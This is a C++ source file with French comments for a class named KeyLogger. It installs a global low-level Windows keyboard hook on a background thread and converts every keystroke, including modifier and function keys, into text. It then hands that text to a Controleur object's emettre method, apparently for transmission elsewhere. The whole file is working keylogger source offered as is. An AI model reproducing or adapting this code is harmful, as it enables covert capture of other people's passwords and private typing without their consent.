/*!
* \file KeyLogger.cpp
* Fichier source de la classe KeyLogger
* \author Xavier Monin
* \date 09/11/2008
*/

#include "KeyLogger.h"
#include "Controleur.h"
#include <windows.h>
#include <iostream>

using namespace std;

// Ces variables sont statiques et doivent donc être initialisées
HHOOK KeyLogger::hKeyHook = 0;
HANDLE KeyLogger::hThread = 0;
KeyLogger* KeyLogger::instance = NULL;
bool KeyLogger::en_cours = false;
Controleur* KeyLogger::envoyer = NULL;

/*!
* \brief Instancie un unique objet KeyLogger.
* Renvoi l'objet déja instancié, ou l'instancie si il n'existe pas encore.
*/
KeyLogger* KeyLogger::instancier()
{
	if (instance != NULL)
		return instance;
	else
		return (instance = new KeyLogger());
}

//! \brief Détruit l'unique objet KeyLogger.
void KeyLogger::liberer()
{
	if (instance != NULL)
	{
		delete instance;
		instance = NULL;
	}
}

/*!
* \brief Contructeur de la classe KeyLogger.
* Ce constructeur est uniquement appelé par KeyLogger::instancier().
*/
KeyLogger::KeyLogger()
{
}

/*!
* \brief Destructeur de la classe KeyLogger.
* Ce destructeur est appelé uniquement par KeyLogger::liberer().
*/
KeyLogger::~KeyLogger()
{
	if (en_cours)
	{
		// Le thread est en cours on demande l'arrêt
		arreter();
	}
}

void KeyLogger::definirControleur(Controleur* envoi)
{
	this->envoyer = envoi;
}

//! \brief Boucle des évements du thread.
void KeyLogger::MsgLoop()
{
	MSG message;
	while (GetMessage(&message,NULL,0,0))
	{
		// Il y a un message, donc on l'envoi
		TranslateMessage( &message );
		DispatchMessage( &message );
	}
}

/*!
* \brief Envoi une touche à l'objet Controleur.
* Renvoi l'objet déja instancié, ou l'instancie si il n'existe pas encore.
* \param[in] touche : Touche à envoyer.
*/
void KeyLogger::envoyerDonnees(const std::string& touche)
{
	if ( (envoyer != NULL ) && (!touche.empty()) )
		envoyer->emettre(touche); // Il y a une touche à envoyer, donc on l'envoi
}

/*!
* \brief Traitement des touches.
* Traite les touches pressées.
* \param[in] nCode : Type d'action du Hook.
* \param[in] wParam : Paramètre utilisé pour le Hook.
* \param[in] lParam : Paramètre utilisé pour le Hook.
* \return : 0 si tout c'est bien passé.
*/
LRESULT CALLBACK KeyLogger::KeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
	string cBuf;

	if (!en_cours)
	{
		// On doit arrêter le thread, on poste donc le message
		PostThreadMessage(GetCurrentThreadId(),WM_QUIT,0,0);
		return 1;
	}

	if (nCode != HC_ACTION) // Aucune action, on passe notre chemin
		return CallNextHookEx(hKeyHook, nCode, wParam, lParam);

	// Structure contenant les informations sur les touches
	KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*)lParam);

	// On traite ici les touches qui sont relachées
	if (wParam == WM_KEYUP)
	{
		switch(hooked.vkCode)
		{
			case VK_LMENU : cBuf = ALT_RELACHE; // ALT a été relachée
											
			case VK_RMENU :								break; // ALT GR ne doit rien afficher (sauf combinaison comme @, ], })
			case VK_LCONTROL: if (GetKeyState(VK_RMENU)>=0) // Si ALT GR n'est pas enfoncé
								cBuf = CTRL_G_RELACHE;
														break;
			case VK_RCONTROL: cBuf = CTRL_D_RELACHE;	break;
		}
	}

	// On traite ici les touches pressés
	// WM_KEYDOWN correspond aux touches normals et WM_SYSKEYDOWN aux touche ALT et ALT GR
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
	{
		// Lors de l'appui sur ALT GR, la touche CTRL G est aussi générée, il faut donc la supprimer
		// Il ne faut pas afficher CTRL G lorsque la touche est VK_LCONTROL et généré par WM_SYSKEYDOWN
		// ce qui veut dire qu'il faut afficher les touches lorsqu'elle ne sont pas WM_SYSKEYDOWN ou VK_LCONTROL
		if (wParam != WM_SYSKEYDOWN || hooked.vkCode != VK_LCONTROL)
			cBuf = touchePressee(hooked); // On récupère la touche pressée
	}

	envoyerDonnees(cBuf);

	// Renvoi des messages au système
	return CallNextHookEx(hKeyHook, nCode,wParam,lParam); // -1 si on souhaite ne pas le laisser passer.
}

/*!
* \brief Renvoi la touche pressée.
* Renvoi la chaine de caractère (string) de la touche pressée.
* \param[in] hooked : Structure contenant les infomations sur la touche.
* \return : La touche pressée sous forme de chaine de caractère.
*/
std::string KeyLogger::touchePressee(KBDLLHOOKSTRUCT hooked)
{
	unsigned short wBuf; // Caractère correspondant à la touche
	string cBuf; // Chaine de caractère de la touche
	BYTE KeyState[256]; // Etat des touches du clavier

	switch(hooked.vkCode)
	{
		// Les constantes F1, F2, sont définis dans KeyLogger.h
		case VK_F1		: cBuf = F1;		break;
		case VK_F2		: cBuf = F2;		break;
		case VK_F3		: cBuf = F3;		break;
		case VK_F4		: cBuf = F4;		break;
		case VK_F5		: cBuf = F5;		break;
		case VK_F6		: cBuf = F6;		break;
		case VK_F7		: cBuf = F7;		break;
		case VK_F8		: cBuf = F8;		break;
		case VK_F9		: cBuf = F9;		break;
		case VK_F10		: cBuf = F10;		break;
		case VK_F11		: cBuf = F11;		break;
		case VK_F12		: cBuf = F12;		break;

		case VK_LMENU	: if (GetKeyState(VK_LMENU)>=0) // => Si ALT n'est pas pressée
							  cBuf = ALT_PRESSE;
											break;

		case VK_RMENU	:					break;

		case VK_LCONTROL: if (GetKeyState(VK_LCONTROL)>=0)
							  cBuf = CTRL_G_PRESSE;
											break;

		case VK_RCONTROL: if (GetKeyState(VK_RCONTROL)>=0)
							  cBuf = CTRL_D_PRESSE;
											break;

		case VK_LWIN	: cBuf = WINDOWS_G;	break;
		case VK_RWIN	: cBuf = WINDOWS_D;	break;

		case VK_INSERT	: cBuf = INSER;		break;
		case VK_DELETE	: cBuf = SUPPR;		break;
		case VK_HOME	: cBuf = DEBUT;		break;
		case VK_END		: cBuf = FIN;		break;
		case VK_PRIOR	: cBuf = PAGE_HAUT;	break;
		case VK_NEXT	: cBuf = PAGE_BAS;	break;
		
		case VK_TAB		: cBuf = TAB;		break;

		case VK_BACK	: cBuf = EFFACER;	break;
		case VK_RETURN	: cBuf = ENTREE;	break;
		
		case VK_ESCAPE	: cBuf = ESC;		break;
		case VK_NUMLOCK	: cBuf = VERR_NUM;	break;
		case VK_ATTN	: cBuf = ATTN;		break;

		case VK_APPS	: cBuf = MENU;		break;
		
		case VK_LEFT	: cBuf = GAUCHE;	break;
		case VK_UP		: cBuf = HAUT;		break;
		case VK_RIGHT	: cBuf = DROITE;	break;
		case VK_DOWN	: cBuf = BAS;		break;
		case VK_SELECT	: cBuf = SELECT;	break;
		case VK_EXECUTE	: cBuf = EXECUTER;	break;

		case VK_SNAPSHOT: cBuf = IMPR_ECRAN;break;
		case VK_SCROLL	: cBuf = VERR_DEF;	break;
		case VK_PAUSE	: cBuf = PAUSE;		break;

		case VK_LSHIFT:				// Les touches SHIFT, ET VERR MAJ sont utilisées pour afficher
		case VK_RSHIFT:				// les caractères en MAJUSCULE ou minuscule
		case VK_CAPITAL: break;		// et ne sont donc pas affichées

		default :
			// On affiche les touches normales

			// Etat du clavier
			// GetKeyboardState(KeyState) bug, je fais ma propre copie
			for (int i=0; i<sizeof(KeyState); i++)
				KeyState[i]=(BYTE)GetKeyState(i);

			// On affiche la touche pressée lorsque CTRL est pressée
			if (GetKeyState(VK_RMENU)>=0)	// ALT GR génère un CTRL DROIT alors si ALT GR est pressée
				KeyState[VK_CONTROL]=0;		// on retire le CTRL. 0 signifie non pressée et non commuté

			if (ToAscii(hooked.vkCode, hooked.scanCode, KeyState, &wBuf, 0))
				cBuf = (char)wBuf; // On stock le caractère s'il existe. Ex: ALT GR + & n'existe pas.
	}
	return cBuf;
}

/*!
* \brief Thread de capture de touches.
* Le thread est là pour ne pas bloquer tout le programme juste pour la capture.
* \param[in] inutile : Non utilisé, mais obligatoire pour être conforme au prototype.
*/
DWORD WINAPI KeyLogger::threadKeyLogger(LPVOID)
{
	en_cours=true;

	// Récuperation de l'instance de notre executable
	HINSTANCE hExe = GetModuleHandle(NULL);

	if (hExe == NULL)
		return 1;

	// Demarrage du Hook. Il s'agit d'un Hook Clavier (WH_KEYBOARD_LL)
	// KeyEvent est la fonction qui fait le traitement.
	hKeyHook = SetWindowsHookEx (WH_KEYBOARD_LL,(HOOKPROC) KeyEvent, hExe, NULL);

	if(hKeyHook == NULL)
		return -1;

	// Boucle des messages
	// Bouclera tant que en_cours ne sera pas à false
	MsgLoop();

	// On désactive le hook
	if(UnhookWindowsHookEx(hKeyHook)==0)
		return -1;

	return 0;
}

/*!
* \brief Démarre la capture des touches.
* Lance le thread de capture des touches du clavier.
*/
void KeyLogger::demarrer()
{
	DWORD dwThread;

	if (!en_cours) // Un seul thread doit être exécuté
		hThread = CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE) threadKeyLogger, (LPVOID)this, NULL, &dwThread);
}

/*!
* \brief Stop la capture de touches.
*/
void KeyLogger::arreter()
{
	en_cours = false;
	WaitForSingleObject(hThread, 100); // On attend 100 millisecondes que le thread s'arrête
}
